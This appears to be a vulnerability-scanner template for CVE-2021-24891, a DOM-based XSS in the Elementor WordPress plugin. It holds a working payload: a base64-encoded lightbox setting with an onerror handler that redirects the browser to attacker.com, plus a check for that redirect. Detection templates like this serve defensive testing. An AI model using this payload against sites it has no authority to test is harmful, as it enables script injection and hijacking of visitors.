id: CVE-2021-24891

info:
  name: WordPress Elementor Website Builder <3.1.4 - DOM XSS
  author: kaks3c
  severity: medium
  description: |
   https://wpscan.com/vulnerability/fbed0daa-007d-4f91-8d87-4bca7781de2d

variables:
  payload: |
    {
        "type": "video",
        "url": "http://",
        "videoType": "hosted",
        "videoParams": {
            "onerror":"window.location.href='http://attacker.com';",
            "style": "background-color:red"
        }
    }
  encoded_payload: "{{base64(payload)}}"

headless:
  - steps:
      - args:
          url: "{{BaseURL}}/#elementor-action:action=lightbox&settings={{encoded_payload}}"
        action: navigate

      - action: waitload

    matchers:
      - type: word
        part: body
        words:
          - "Attacker - The Domain Name Attacker.com is Now For Sale"
